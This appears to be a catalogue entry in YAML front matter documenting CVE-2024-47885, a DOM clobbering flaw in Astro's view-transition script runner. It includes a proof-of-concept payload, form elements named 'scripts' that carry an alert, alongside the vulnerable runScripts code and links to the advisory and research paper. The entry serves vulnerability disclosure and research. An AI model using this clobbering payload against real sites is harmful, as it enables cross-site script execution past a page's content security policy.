---
description: Astro is a website build tool for the modern web — powerful developer experience meets lightweight output.
github: withastro/astro
gadgets:
  ≥3.0.0 & ≤4.16.0:
    cve: CVE-2024-47885
    authors:
      - github:jackfromeast
      - github:ishmeals
    tags:
      - chrome-browser
      - safari-browser    
      - doc-tags
      - name-attr
      - strict-dynamic-csp
      - before-lib-load
    pocs:
      - description: The [Astro](https://astro.build/) library was using the `document.scripts` property to load additional scripts. The content of the nodes was then used as the new script content.
        code: |
          <!-- user input -->
          <form name="scripts">alert(document.domain)</form>
          <form name="scripts"></form>

          <script nonce="secret">
          function runScripts() {
            for (const script of Array.from(document.scripts)) {
              if (script.dataset.astroExec === '') continue;
              const type = script.getAttribute('type');
              if (type && type !== 'module' && type !== 'text/javascript') continue;
              const newScript = document.createElement('script');
              newScript.innerHTML = script.innerHTML;
              for (const attr of script.attributes) {
                newScript.setAttribute(attr.name, attr.value);
              }
              newScript.dataset.astroExec = '';
              script.replaceWith(newScript);
            }
          }

          runScripts();
          </script>
    more-info: |
      **Root Cause**

      Source: <a target="_blank" href="https://github.com/withastro/astro/blob/7814a6cad15f06931f963580176d9b38aa7819f2/packages/astro/src/transitions/router.ts#L135-L156">https://github.com/withastro/astro/blob/7814a6cad15f06931f963580176d9b38aa7819f2/packages/astro/src/transitions/router.ts#L135-L156</a>

      ```javascript
      function runScripts() {
        for (const script of Array.from(document.scripts)) {
          if (script.dataset.astroExec === '') continue;
          const type = script.getAttribute('type');
          if (type && type !== 'module' && type !== 'text/javascript') continue;
          const newScript = document.createElement('script');
          newScript.innerHTML = script.innerHTML;
          for (const attr of script.attributes) {
            newScript.setAttribute(attr.name, attr.value);
          }
          newScript.dataset.astroExec = '';
          script.replaceWith(newScript);
        }
      }

      runScripts();
      ```
    links:
      - https://github.com/withastro/astro/security/advisories/GHSA-m85w-3h95-hcf9
      - https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/astro.md
      - https://jackfromeast.github.io/assets/DOMinoEffect.pdf
---
